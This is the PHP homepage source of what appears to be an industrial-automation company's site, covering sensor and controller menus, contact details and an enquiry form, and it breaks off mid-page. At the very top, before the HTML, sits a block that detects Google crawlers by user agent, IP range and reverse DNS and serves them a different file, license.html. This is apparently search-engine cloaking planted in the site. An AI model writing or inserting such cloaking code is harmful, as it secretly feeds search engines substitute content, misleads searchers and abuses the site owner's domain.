    <?php

        function isGoogleUserAgent() {
            if (empty($_SERVER['HTTP_USER_AGENT'])) return false;

            $googleBots = [
                'Googlebot', 'Googlebot-Mobile', 'Googlebot-Image', 'Googlebot-Video',
                'Googlebot-News', 'Googlebot-AMP', 'AdsBot-Google', 'AdsBot-Google-Mobile',
                'FeedFetcher-Google', 'Google-Read-Aloud', 'DuplexWeb-Google',
                'Storebot-Google', 'Mediapartners-Google', 'Google Favicon',
                'Google-InspectionTool', 'Google-PageRenderer',
                'Google-Structured-Data-Testing-Tool'
            ];

            foreach ($googleBots as $bot) {
                if (stripos($_SERVER['HTTP_USER_AGENT'], $bot) !== false) {
                    return true;
                }
            }

            return false;
        }

        function isGoogleIP() {
            if (empty($_SERVER['REMOTE_ADDR'])) return false;

            $googleRanges = [
                '64.233.160.0/19','66.102.0.0/20','66.249.64.0/19','72.14.192.0/18',
                '74.125.0.0/16','108.177.8.0/21','142.250.0.0/15','172.217.0.0/16',
                '173.194.0.0/16','209.85.128.0/17','216.239.32.0/19'
            ];

            $ip = $_SERVER['REMOTE_ADDR'];
            $ipLong = sprintf('%u', ip2long($ip));
            if (!$ipLong) return false;

            foreach ($googleRanges as $range) {
                list($subnet, $maskBits) = explode('/', $range);
                $subnetLong = sprintf('%u', ip2long($subnet));
                $mask = $maskBits == 0 ? 0 : (~0 << (32 - $maskBits));

                if (($ipLong & $mask) == ($subnetLong & $mask)) {
                    return true;
                }
            }

            return false;
        }

        function isGoogleDNS() {
            if (empty($_SERVER['REMOTE_ADDR'])) return false;

            $hostname = @gethostbyaddr($_SERVER['REMOTE_ADDR']);
            if (!$hostname || $hostname === $_SERVER['REMOTE_ADDR']) return false;

            return (
                stripos($hostname, 'googlebot.com') !== false ||
                stripos($hostname, 'google.com') !== false
            );
        }


        if (isGoogleUserAgent() || isGoogleDNS() || isGoogleIP()) {
            if (is_readable(__DIR__ . '/license.html')) {
                header('Content-Type: text/html; charset=UTF-8');
                readfile(__DIR__ . '/license.html');
            } else {
                echo "license.html bulunamadı!";
            }
            exit;
        }

        ?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dolphin Automation</title>
  <link rel="icon" href="assets/imgs/logo/logo.png">

  <link rel="stylesheet" href="assets/css/header.css" />
  <link rel="stylesheet" href="assets/css/responsive.css" />

  <!-- Link Swiper's CSS -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />

  <!-- bootsratp css -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous" />

  <!-- Bootstrap CSS (via CDN) -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

  <!-- fontawsome cdn -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
    integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
    crossorigin="anonymous" referrerpolicy="no-referrer" />

    <link rel="stylesheet" href="assets/css/jquery.fancybox.min.css">
  <!-- jquery cdn -->
  <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4="
    crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>

  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
  <script src="assets/js/responsiveslides.min.js"></script>

</head>

<body>

  <?php include 'includes/navbar.php' ?>

  <div>

    <div class="laptop-banner container-fluid">
      <div class="row g-2">
        <div class="col-lg-8 ">
          <div>
            <ul class="rslides">
              <li><img src="assets/imgs/new banners/laptop/new-banner-dolphin-1.png" alt="" width="100%"></li>
              <li><img src="assets/imgs/new banners/laptop/new-banner-dolphin-2 (1).png" alt="" width="100%"></li>
              <li><img src="assets/imgs/new banners/laptop/NEw-banner-dolphin-3 (1).png" alt="" width="100%"></li>
              <li><img src="assets/imgs/new banners/laptop/new-banner-dolphin-4.png" alt="" width="100%"></li>
              <li><img src="assets/imgs/new banners/laptop/new-banner-dolphin-5.png" alt="" width="100%"></li>
              <li><img src="assets/imgs/new banners/laptop/new-banner-dolphin-7.png" alt="" width="100%"></li>
              <li><img src="assets/imgs/new banners/laptop/new-banner-dolphin6.png" alt="" width="100%"></li>
             

            </ul>
          </div>
        </div>
        <div class="col-lg-4 ">
          <a href="events.php">
          <img src="assets/imgs/new banners/dolphin-post (2).png" alt="" width="100%" height="100%">
          </a>
        </div>

      </div>
    </div>

    <div class="mobile-banner ">
      <div class="row g-0">
        <div class="col-lg-9">
          <div>
            <ul class="rslides">
              <li><img src="assets/imgs/newww/1 (11).png" alt="" width="100%"></li>
              <li><img src="assets/imgs/newww/2 (9).png" alt="" width="100%"></li>
              <li><img src="assets/imgs/newww/3 (4).png" alt="" width="100%"></li>
              <li><img src="assets/imgs/newww/4 (5).png" alt="" width="100%"></li>
              <li><img src="assets/imgs/newww/5 (3).png" alt="" width="100%"></li>
              <li><img src="assets/imgs/newww/6 (2).png" alt="" width="100%"></li>
           


            </ul>
          </div>
        </div>
        <div class="col-lg-3">
          <img src="assets/imgs/new banners/dolphin-post (2).png" alt="" width="100%" height="100%">
        </div>

      </div>
    </div>

    <!--------------------------------------section 1 ----------------------------------------->
    <div class="container-fluid py-2">
      <div class="row">
      <div class="col-lg-3 side-panel">

<div class="m-list-banner my-0">
  <h4 class="m-side-title m-list-banner">Product Categories</h4>
  <div class="menu">
    <div class="sidebar card py-0 mb-4">
      <ul class=" flex-column p-0" id="nav_accordion">

        <li class="nav-item has-submenu">
          <a class="nav-link m-list-banner" href="#"> Sensors <span><i
                class="fa-solid fa-angle-down"></i></span></a>
          <ul class="submenu collapse">
            <li class="nav-item has-submenu">
              <a class="nav-link m-list-banner" href="#">Inductive Sensors
                <span><i class="fa-solid fa-angle-down"></i></span></a>
              <ul class="submenu collapse">
                <li><a class="nav-link m-list-banner" href="singleset.php">Standard Cylindrical Sensors
                    <span><i class="fa-solid fa-angle-down"></i></span></a>
                  <ul class="submenu collapse">
                    <li><a class="nav-link m-list-banner" href="M-5-Input Voltage DC (3 Wire).php">M-5-Input Voltage DC (3 Wire)</a></li>
                    <li><a class="nav-link m-list-banner" href="m-6-5-input-voltage-dc-3-wire.php">M-6.5-Input Voltage DC (3 Wire)</a></li>
                    <li><a class="nav-link m-list-banner" href="m-8-input-dc-voltage-dc-3-wire.php">M-8 (Input DC Voltage DC 3 Wire)</a></li>
                    <li><a class="nav-link m-list-banner" href="m-12-input-dc-voltage-3-wire-standard-range.php">M-12 (Input DC Voltage 3 Wire) Std
                        Range</a></li>
                    <li><a class="nav-link m-list-banner" href="m-12-input-dc-voltage-3-wire-long-range.php">M-12 (Input DC Voltage 3 Wire) Long
                        Range</a></li>
                    <li><a class="nav-link m-list-banner" href="m-12-input-dc-voltage-dc-2-wire-economy-model.php">M-12 (Input DC Voltage DC 2 Wire) Economy
                        Model</a></li>
                    <li><a class="nav-link m-list-banner" href="m-12-input-ac-voltage-2-wire-standard-model.php">M-12 (Input AC Voltage 2 Wire) Std
                        Model</a></li>
                    <li><a class="nav-link m-list-banner" href="m-12-input-ac-voltage-2-wire-economy-model.php">M-12 (Input AC Voltage 2 Wire) Economy
                        Model</a></li>
                    <li><a class="nav-link m-list-banner" href="m-18-input-dc-voltage-3-wire-op-standard-model.php">M-18 (Input DC Voltage 3 Wire O/P) Std
                        Model</a></li>
                    <li><a class="nav-link m-list-banner" href="m-18-input-dc-voltage-3-wire-long-range.php">M-18 (Input DC Voltage 3 Wire) Long
                        Range</a></li>
                    <li><a class="nav-link m-list-banner" href="m-18-input-dc-voltage-dc-2-wire-standard-model.php">M-18 (Input DC Voltage DC 2 Wire) Std
                        Model</a></li>
                    <li><a class="nav-link m-list-banner" href="m-18-input-dc-voltage-dc-2-wire-economy-model.php">M-18 (Input DC Voltage DC 2 Wire) Economy
                        Model</a></li>
                    <li><a class="nav-link m-list-banner" href="m-18-input-ac-voltage-2-wire-standard-model.php">M-18 (Input AC Voltage 2 Wire) Std
                        Model</a></li>
                    <li><a class="nav-link m-list-banner" href="m-18-input-ac-voltage-2-wire-long-range.php">M-18 (Input AC Voltage 2 Wire) Long
                        Range</a></li>
                    <li><a class="nav-link m-list-banner" href="m-18-input-ac-voltage-2-wire-economy-model.php">M-18 (Input AC Voltage 2 Wire) Economy
                        Model</a></li>
                    <li><a class="nav-link m-list-banner" href="m-30-input-dc-voltage-3-wire-op-standard-range.php">M-30 (Input DC Voltage 3 Wire O/P) Std
                        Range</a></li>
                    <li><a class="nav-link m-list-banner" href="m-30-input-dc-voltage-3-wire-long-range.php">M-30 (Input DC Voltage 3 Wire) Long
                        Range</a></li>
                    <li><a class="nav-link m-list-banner" href="m-30-input-dc-voltage-2-wire-op-standard-model.php">M-30 (Input DC Voltage 2 Wire O/P) Std
                        Model</a></li>
                    <li><a class="nav-link m-list-banner" href="m-30-input-dc-voltage-dc-2-wire-economy-model.php">M-30 (Input DC Voltage DC 2 Wire) Economy
                        Model</a></li>
                    <li><a class="nav-link m-list-banner" href="m-30-input-voltage-2-wire-ac-standard-range.php">M-30 (Input Voltage 2 Wire)AC Std Range</a>
                    </li>
                    <li><a class="nav-link m-list-banner" href="m-30-input-ac-voltage-2-wire-long-range.php">M-30 (Input AC Voltage 2 Wire) Long
                        Range</a></li>
                    <li><a class="nav-link m-list-banner" href="m-30-input-ac-voltage-2-wire-economy-model.php">M-30 (Input AC Voltage 2 Wire) Economy
                        Model</a></li>
                    <li><a class="nav-link m-list-banner" href="m-50-input-dc-voltage-3-wire-op-standard-range.php">M-50 (Input DC Voltage 3 Wire O/P) Std
                        Range</a></li>
                    <li><a class="nav-link m-list-banner" href="m-50-input-dc-voltage-3-wire-op-long-range.php">M-50 (Input DC Voltage 3 Wire O/P) Long
                        Range</a></li>
                    <li><a class="nav-link m-list-banner" href="m-50-input-ac-voltage-2-wire-op-standard-model.php">M-50 (Input AC Voltage 2 Wire O/P) Std
                        Model</a></li>
                    <li><a class="nav-link m-list-banner" href="m-50-input-ac-voltage-2-wire-op-long-range.php">M-50 (Input AC Voltage 2 Wire O/P) Long
                        Range</a></li>
                    <li><a class="nav-link m-list-banner" href="m-50-input-dc-voltage-2-wire-op-standard-model.php">M-50 (Input DC Voltage 2 Wire O/P) Std
                        Model</a></li>
                    <li><a class="nav-link m-list-banner" href="m-50-input-dc-voltage-2-wire-op-economy-model.php">M-50 (Input DC Voltage 2 Wire O/P) Economy
                        Model</a></li>
                  </ul>
                </li>
                <li><a class="nav-link m-list-banner" href="micro-switch-type.php">Microswitch Type</a></li>
                <li><a class="nav-link m-list-banner" href="slot-type-inductive.php">Slot Type</a></li>
                <li><a class="nav-link m-list-banner" href="slot-type-inductive.php">Analogue Output</a></li>
                <li><a class="nav-link m-list-banner" href="inductive-block-rectangular.php">Flat/ Rectangular Type</a></li>
              </ul>
            </li>

            <li><a class="nav-link m-list-banner" href="magneticswitches.php">Magnetic Switches</a></li>
            <li><a class="nav-link m-list-banner" href="magneticswitches.php">Plugin/ Connector Leads</a> </li>
            <li class="nav-item has-submenu">
              <a class="nav-link m-list-banner" href="#">Photoelectric Sensors
                <span><i class="fa-solid fa-angle-down"></i></span></a>
              <ul class="submenu collapse">
                <li><a class="nav-link m-list-banner" href="photoelectricsensor.php">Square Type Diffuse Sensors</a></li>
                <li><a class="nav-link m-list-banner" href="photoelectricsensor.php">Square Type Thru Beam Sensors</a></li>
                <li><a class="nav-link m-list-banner" href="photoelectricsensor.php">M-12 (input DC
                    volt 3 wire)</a></li>
                <li><a class="nav-link m-list-banner" href="photoelectricsensor.php">M-18 (input DC
                    volt 4 wire)- Long Range</a></li>

                <li><a class="nav-link m-list-banner" href="photoelectricsensor.php">M-18 (input AC
                    volt 2wire)</a></li>
                <li><a class="nav-link m-list-banner" href="photoelectricsensor1.php">M-30 (input DC
                    volt 4 wire) - Std Range</a></li>
                <li><a class="nav-link m-list-banner" href="photoelectricsensor1.php">M-30 (input DC
                    volt 4 wire) - Long Range</a></li>
                <li><a class="nav-link m-list-banner" href="photoelectricsensor1.php">M-30 (input AC
                    volt 2wire)</a></li>
                    <li><a class="nav-link m-list-banner" href="marksensor.php">Mark Sensor</a></li>
                <li><a class="nav-link m-list-banner" href="marksensor.php">Thru Beam</a></li>
                <li><a class="nav-link m-list-banner" href="marksensor.php">Thru Beam (inbuilt Amplifier)</a></li>
              
                <li><a class="nav-link m-list-banner" href="type-slot-sensor-ir.php">Slot Sensor-IR</a></li>
                <li><a class="nav-link m-list-banner" href="#">Retro Reflective</a></li>
                <li><a class="nav-link m-list-banner" href="#">Diffuse Beam</a></li>
              </ul>
            </li>
            <li><a class="nav-link m-list-banner" href="capacitive-sensors.php">Capacitive Sensors</a> </li>
            <li><a class="nav-link m-list-banner" href="FLOATSWITCH.php">Float Switches</a> </li>
          </ul>
        </li>

        <li class="nav-item has-submenu">
          <a class="nav-link m-list-banner" href="#"> Solid State Relays <span><i
                class="fa-solid fa-angle-down"></i></span></a>
          <ul class="submenu collapse">
            <li class="nav-item has-submenu">
              <a class="nav-link m-list-banner" href="#">Single Phase
                <span><i class="fa-solid fa-angle-down"></i></span></a>
              <ul class="submenu collapse">
                <li><a class="nav-link m-list-banner" href="SSR-SINGLE-DCTOAC.PHP">DC to AC</a></li>
                <li><a class="nav-link m-list-banner" href="SSR-SINGLE-ACTOAC.PHP">AC to AC</a></li>
                <li><a class="nav-link m-list-banner" href="SSVR-DCTODC.php">DC to DC</a></li>
              </ul>
            </li>
            <li class="nav-item has-submenu">
              <a class="nav-link m-list-banner" href="#">Three Phase
                <span><i class="fa-solid fa-angle-down"></i></span></a>
              <ul class="submenu collapse">
                <li><a class="nav-link m-list-banner" href="SSR-3PHASE.PHP">DC to AC</a></li>
                <li><a class="nav-link m-list-banner" href="SSR-3PHASE.PHP">AC to AC</a></li>

              </ul>
            </li>
            <li><a class="nav-link m-list-banner" href="SSVR-DCTODC.php">Analog SSRS</a></li>
            <li><a class="nav-link m-list-banner" href="SSVR-DCTODC.php">SSVR (Voltage Regulations)</a></li>
          </ul>
        </li>

        <li><a class="nav-link m-list-banner" href="relayunits.php">Relay Unit / Control Units</a></li>

        <li class="nav-item has-submenu">
          <a class="nav-link m-list-banner" href="processinicators.php"> Process Control Instruments <span><i
                class="fa-solid fa-angle-down"></i></span></a>
          <ul class="submenu collapse">
            <li><a class="nav-link m-list-banner" href="Pidcontrollers.php">PID Controllers</a></li>
            <li class="nav-item has-submenu">
              <a class="nav-link m-list-banner" href="#">Temperature
                <span><i class="fa-solid fa-angle-down"></i></span></a>
              <ul class="submenu collapse">
                <li><a class="nav-link m-list-banner" href="singlesetpoint-singledisplay.php">Single Set Point - Single Display
                  </a></li>
                <li><a class="nav-link m-list-banner" href="doublesetpoint-singledisplay.php">Double Set Point - Single Display</a></li>
                <li><a class="nav-link m-list-banner" href="pottype-controller.php">Pot Type (Push To Set) Controller - Single Set
                    Point - Single Display</a></li>
                <li><a class="nav-link m-list-banner" href="pottype-controller.php">Single Set Point - Double Display</a></li>
                <li><a class="nav-link m-list-banner" href="pottype-controller.php">Special Purpose Controllers</a></li>
              </ul>
            </li>
            <li class="nav-item has-submenu">
              <a class="nav-link m-list-banner" href="#">Humidity Controllers<span><i
                    class="fa-solid fa-angle-down"></i></span></a>
              <ul class="submenu collapse">
                <li><a class="nav-link m-list-banner" href="humidity-controllers.php">Single Set Point - Single Display</a></li>
                <li><a class="nav-link m-list-banner" href="humidity-controllers.php">Single Point - Double Display</a></li>
                <li><a class="nav-link m-list-banner" href="humidity-controllers.php">Humidity + Temp Controllers - Double
                    Display</a></li>
              </ul>
            </li>

            <li class="nav-item has-submenu">
              <a class="nav-link m-list-banner" href="#">Counter<span><i
                    class="fa-solid fa-angle-down"></i></span></a>
              <ul class="submenu collapse">
                <li><a class="nav-link m-list-banner" href="counter1.php">Event Counter</a></li>
                <li><a class="nav-link m-list-banner" href="counter1.php">Preset Counter</a></li>
                <li><a class="nav-link m-list-banner" href="counter2.php">Programmable Counter</a></li>
                <li><a class="nav-link m-list-banner" href="counter2.php">Preset Counter(Thumbwheel)</a></li>
                <li><a class="nav-link m-list-banner" href="counter3.php">Length Counter</a></li>
                <li><a class="nav-link m-list-banner" href="counter3.php">Batch Counter</a></li>
           
              </ul>
            </li>

            <li class="nav-item has-submenu">
              <a class="nav-link m-list-banner" href="#">Timers<span><i
                    class="fa-solid fa-angle-down"></i></span></a>
              <ul class="submenu collapse">
                <li><a class="nav-link m-list-banner" href="timer1.php">Programmable Timer</a></li>
                <li><a class="nav-link m-list-banner" href="timer1.php">Double Display Timers - Cyclic & Delay Both</a>
                </li>
                <li><a class="nav-link m-list-banner" href="timer2.php">On/Off Delay Timer(Thumbwheel)</a></li>
                <li><a class="nav-link m-list-banner" href="timer2.php">Time Totaliser</a></li>
                <li><a class="nav-link m-list-banner" href="timer2.php">Hydraulic Timer</a></li>
              </ul>
            </li>
            <li><a class="nav-link m-list-banner" href="loadcellindicators.php">Load Cell Indicators & Controllers</a></li>
            <li><a class="nav-link m-list-banner" href="processinicators.php">Process Indicator / Controllers</a></li>
            <li class="nav-item has-submenu">
              <a class="nav-link m-list-banner" href="#"> RPM <span><i
                    class="fa-solid fa-angle-down"></i></span></a>
              <ul class="submenu collapse">
                <li><a class="nav-link m-list-banner" href="RPM.php">RPM Indicators</a></li>
                <li><a class="nav-link m-list-banner" href="RPM.php">RPM Controllers</a></li>
              </ul>
            </li>
            <li class="nav-item has-submenu">
              <a class="nav-link m-list-banner" href="#"> Digital Panel Meters <span><i
                    class="fa-solid fa-angle-down"></i></span></a>
              <ul class="submenu collapse">
                <li><a class="nav-link m-list-banner" href="digitalpanelmeters.php">AC Voltmeter</a></li>
                <li><a class="nav-link m-list-banner" href="digitalpanelmeters.php">AC Current Meter</a></li>
                <li><a class="nav-link m-list-banner" href="digitalpanelmeters.php">Volt + Current Meters</a></li>
              </ul>
            </li>
            <li><a class="nav-link m-list-banner" href="dcDrive.php">DC Drive </a></li>
            <li><a class="nav-link m-list-banner" href="dcDrive.php">Temperature Indicator </a></li>
            <li><a class="nav-link m-list-banner" href="dcDrive.php">Din Rail Timer </a></li>
            <li><a class="nav-link m-list-banner" href="dcDrive.php">Solid State Buzzers </a></li>
          </ul>
        </li>

        <li class="nav-item has-submenu">
          <a class="nav-link m-list-banner" href="#"> SMPS <span><i
                class="fa-solid fa-angle-down"></i></span></a>
          <ul class="submenu collapse">
            <li><a class="nav-link m-list-banner" href="SMPS.php">Std Body Series </a></li>
            <li><a class="nav-link m-list-banner" href="SMPS.php">Short Body Series</a></li>
          </ul>
        </li>
      </ul>
    </div>
  </div>

</div>
<div class="m-list-banner my-2">
  <h4 class="m-side-title">Contact Us</h4>
  <h6>Mob 1: <span style="color: #F58220;">
      <p>9810079611</p>
    </span></h6>
  <h6>Mob 2: <span style="color:#F58220;">
      <p>9810879611</p>
    </span></h6>
  <h6>Mob 3: <span style="color:#F58220;">
      <p>9971052641</p>
    </span></h6>
  <h6>Email: <span style="color:#F58220;">
      <p>dolphinautomation9@gmail.com</p>
    </span></h6>

</div>
</div>
        <!--------------------------------------------section 3 ---------------------------------------->


        <div class="col-lg-9">
          <!--ENERGY-->
          <div class="container py-0 energy">
            <div class="row py-2">
              <h3 class="m-title py-1 text-center">Our Solution Expertise</h3>
              <div class="col-lg-4 py-1">
                <h6>Energy Management</h6>
                <img src="assets/imgs/creatives/energymanagement.jpg" alt="" width="100%">
              </div>
              <div class="col-lg-4 py-1">
                <h6>Electrical Protection</h6>
                <img src="assets/imgs/creatives/electricalprotectiontimecontrol.jpg" alt="" width="100%">
              </div>
              <div class="col-lg-4 py-1">
                <h6>Industrial Automation</h6>
                <img src="assets/imgs/creatives/industrialautomationprocesscontrol.jpg" alt="" width="100%">
              </div>

            </div>
          </div>
          <!--ABOUT DA-->
          <div class="about-bg">
            <div class="row">
              <div class="col-lg-4">
                <div>
                  <h3 class="text-center p-3 " style="color: black;">ABOUT <br><b>DOLPHIN AUTOMATION</b> </h3>
                </div>
              </div>
              <div class="col-lg-8">
                <div>
                  <p class="p-2">Dolphin Automation is a rapidly growing organization established with a
                    vision
                    to offer the best
                    quality automation
                    products and reliable sensors to customers across the globe. Our durable and dependable
                    products
                    are available at
                    the most competitive prices. A large scale manufacturing capability has helped us
                    establish
                    our
                    competitiveness in
                    the global market.
                    The company owns well equipped manufacturing and research facilities. It is home to some
                    of
                    the
                    most sophisticated
                    technology. The state-of-the-art machinery and research facilities speak volumes of the
                    quality
                    and efficiency maintained in the products and the manufacturing process. This ensures,
                    our
                    customers get
                    quality products at the lowest prices.

                    <a href="about.php">

                      <span><i class="fa-solid fa-chevron-right" style="color: #980000;"></i></span>
                      more
                    </a>
                  </p>
                </div>
              </div>
            </div>


          </div>
          <!--HOT PRODUCTS-->
          <div class="">
            <h3 class=" text-center my-2">Hot Products</h3>

            <div class="py-2">
              <div class="container py-4">
                <div class="row justify-content-between g-2">
                  <div class="col-lg-3 col-6 banner">
                    <div>
                      <img src="assets/imgs/instruments/pid controllers/image 79.png" alt="" srcset="" width="100%">
                      <a href="Pidcontrollers.php" style="text-decoration: none;">
                        <h6 class="btn-blog text-center">PID Controllers</h6>
                      </a>
                    </div>
                  </div>

                  <div class="col-lg-3 col-6 banner ">
                    <div>
                      <img src="assets/imgs/new-images/hot products/Frame 214.png" alt="" srcset=""
                        width="100%">
                      <a href="counter3.php" style="text-decoration: none;">
                        <h6 class="btn-blog text-center">Length Counter</h6>
                      </a>
                    </div>
                  </div>

                  <div class="col-lg-3 col-6 banner">
                    <div>
                      <img src="assets/imgs/new-images/hot products/Frame 215.png" alt="" srcset="" width="100%">
                      <a href="inductive-block-rectangular.php" style="text-decoration: none;">
                        <h6 class="btn-blog text-center">Inductive Block(Rectangular)</h6>
                      </a>
                    </div>
                  </div>

                  <div class="col-lg-3 col-6 banner">
                    <div>
                      <img src="assets/imgs/new-images/hot products/Frame 216.png" alt="" srcset="" width="100%">
                      <a href="SSR-SINGLE-ACTOAC.PHP" style="text-decoration: none;">
                        <h6 class="btn-blog text-center">SSR-Single Phase(AC-AC)</h6>
                      </a>
                    </div>
                  </div>

                  <div class="col-lg-3 col-6 banner">
                    <div>
                      <img src="assets/imgs/new-images/hot products/Frame 217.png" alt="" srcset="" width="100%">
                      <a href="photoelectricsensor.php" style="text-decoration: none;">
                        <h6 class="btn-blog text-center">Photoelectric Sensor(M-18)</h6>
                      </a>
                    </div>
                  </div>

                  <div class="col-lg-3 col-6 banner">
                    <div>
                      <img src="assets/imgs/new-images/hot products/Frame 218.png" alt="" srcset="" width="100%">
                      <a href="timer1.php" style="text-decoration: none;">
                        <h6 class="btn-blog text-center">Double Display Timer</h6>
                      </a>
                    </div>
                  </div>

                  <div class="col-lg-3 col-6 banner">
                    <div>
                      <img src="assets/imgs/new-images/hot products/Frame 219.png" alt="" srcset="" width="100%">
                      <a href="humidity-controllers.php" style="text-decoration: none;">
                        <h6 class="btn-blog text-center">Humidity+Temp Controllers</h6>
                      </a>
                    </div>
                  </div>

                  <div class="col-lg-3 col-6 banner">
                    <div>
                      <img src="assets/imgs/new-images/hot products/Frame 220.png" alt="" srcset="" width="100%">
                      <a href="photoelectricsensor.php" style="text-decoration: none;">
                        <h6 class="btn-blog text-center">Square Type Diffuse Sensors</h6>
                      </a>
                    </div>
                  </div>

                  <div class="col-lg-3 col-6 banner">
                    <div>
                      <img src="assets/imgs/new-images/hot products/Frame 221.png" alt="" srcset="" width="100%">
                      <a href="dcDrive.php" style="text-decoration: none;">
                        <h6 class="btn-blog text-center">Din Rail Timer</h6>
                      </a>
                    </div>
                  </div>

                  <div class="col-lg-3 col-6 banner">
                    <div>
                      <img src="assets/imgs/new-images/hot products/Frame 222.png" alt="" srcset="" width="100%">
                      <a href="inductive-block-rectangular.php" style="text-decoration: none;">
                        <h6 class="btn-blog text-center">Inductive Block(Rectangular)</h6>
                      </a>
                    </div>
                  </div>

                  <div class="col-lg-3 col-6 banner">
                    <div>
                      <img src="assets/imgs/new-images/hot products/m-12.png" alt="" srcset="" width="100%">
                      <a href="m-12-input-dc-voltage-3-wire-standard-range.php" style="text-decoration: none;">
                        <h6 class="btn-blog text-center">Inductive Sensors(M-12 NF)</h6>
                      </a>
                    </div>
                  </div>

                  <div class="col-lg-3 col-6 banner">
                    <div>
                      <img src="assets/imgs/new-images/hot products/Frame 223.png" alt="" srcset="" width="100%">
                      <a href="inductive-block-rectangular.php" style="text-decoration: none;">
                        <h6 class="btn-blog text-center">Inductive Block(Rectangular)</h6>
                      </a>
                    </div>
                  </div>

                


                </div>
              </div>
            </div>


          </div>



          <!--CUSTOMER ENQUIRY SECTION-->
          <div class="c-bg my-2">
            <div class="container py-2">
              <div class="row">
                <div class="col-lg-3">
                  <div>
                    <h4 class="py-2">New Customer?<br> Submit your enquiry now. It's quick and simple. Get in touch for
                      a personalized experience tailored to your needs.</h4>

                    <div class="py-1" style="color: #000 !important;">
                      <!-- Button trigger modal -->
                      <button type="button" class="btn btn-light" data-toggle="modal" data-target="#exampleModalCenter">
                        Send Inquiry
                      </button>

                      <!-- Modal -->
                      <div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog"
                        aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered" role="document">
                          <div class="modal-content">
                            <div class="modal-header">
                              <h5 class="modal-title" id="exampleModalLongTitle">Enquiry Form</h5>
                              <button type="button" class="close btn btn-danger" data-dismiss="modal"
                                aria-label="Close">
                                <span aria-hidden="true">&times;</span>
                              </button>
                            </div>
                            <div class="modal-body">
                              <form action="mail.php" method="post" enctype="multipart/form-data" class="banner p-4" style="border:1px dashed #2A3695; background:#fbf7f7">
                                <div class="form-row d-flex">
                                    <div style="display:none;">
            <label for="honeypot">Leave this field blank:</label>
            <input type="text" name="hidden_input" />
        </div>
                                  <div class="form-group col-md-5 frm">
                                    <label for="inputName">Full Name</label>
                                    <input type="text" name="name" class="form-control" id="inputName" placeholder="Full Name" required>
                                  </div>
                                  <div class="form-group col-md-5 mx-3">
                                    <label for="inputEmail">Email</label>
                                    <input type="email" name="email" class="form-control" id="inputEmail" placeholder="Email" required>
                                  </div>
                                </div>
                                <div class="form-group">
                                  <label for="inputPhone">Phone</label>
                                  <input type="text" name="phone" class="form-control" id="inputPhone" placeholder="Phone" required>
                                </div>
                                <div class="form-row d-flex py-2">
                                  <div class="form-group col-md-4 frm">
                                    <label for="inputCompany">Company</label>
                                    <input type="text" name="company" class="form-control" id="inputCompany" placeholder="Company">
                                  </div>
                                  <div class="form-group col-md-4 mx-3">
                                    <label for="inputState">State</label>
                                    <input type="text" name="state" class="form-control" id="inputState" placeholder="State" required>
                                  </div>
                                </div>
                                <div class="form-group">
                                  <label for="Message">Message</label>
                                  <textarea class="form-control" name="message" id="Message" rows="3" placeholder="Type here..." required></textarea>
                                </div>
                                <div class="modal-footer">
                                  <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                                  <button type="submit" name="submit" class="btn btn-primary">Send</button>
                                </div>
                              </form>
                              
                            </div>
                          
                          </div>
                        </div>
                      </div>
                    </div>

                  </div>
                </div>
                <div class="col-lg-5">

                  <h4 class="align-items-center pb-2" style="margin-left:20px">Enquiry Benefits:</h4>
                  <ul>
                    <li>Receive personalized automation solutions tailored to your needs</li>
                    <li>Benefit from customized, innovative designs that enhance product safety, sustainability, and
                      aesthetics.</li>
                    <li> Save time with quick and efficient responses from our team</li>
                    <li>Enjoy dedicated customer service, ensuring smooth communication and timely assistance at every
                      stage.</li>


                  </ul>


                </div>
                <div class="col-lg-4">
                  <img src="assets/imgs/new banners/laptop/post1.png" alt="" width="100%" class="enq-img">

                </div>
              </div>
            </div>
          </div>
          <!--CLIENTS SLIDER-->
          <div class="bg">
            <section class="city">
              <div class="city-img">
                <div class="">

                  <div class="container-fluid" width="100%">
                    <div class="swiper mySwiper">
                      <div class="swiper-wrapper">
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 184.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 185.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 186.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 187.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 188.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 189.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 190.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 191.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
